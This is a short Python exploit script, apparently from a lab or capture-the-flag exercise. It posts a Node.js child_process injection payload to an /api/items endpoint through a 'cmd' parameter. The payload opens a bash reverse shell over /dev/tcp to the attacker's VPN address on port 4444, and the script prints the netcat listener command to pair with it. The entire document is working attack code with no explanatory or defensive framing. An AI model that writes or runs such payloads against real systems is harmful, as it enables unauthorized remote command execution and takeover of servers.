import requests, sys

RCE_URL = "http://10.66.147.196/api/items"
COOKIE = {"token": "this_is_not_real"}

# Get a proper reverse shell via Node.js
# Using bash -i redirect to our VPN IP
attacker_ip = "10.8.2.128"  # VPN interface
port = "4444"

cmd = f"bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1 &'"
payload = f"require('child_process').execSync('{cmd}')"

print(f"[*] Sending reverse shell to {attacker_ip}:{port}")
print(f"[*] Make sure: nc -lvnp {port}")

r = requests.post(
    RCE_URL,
    params={"cmd": payload},
    cookies=COOKIE,
    timeout=5
)
print(f"[*] Response status: {r.status_code}")
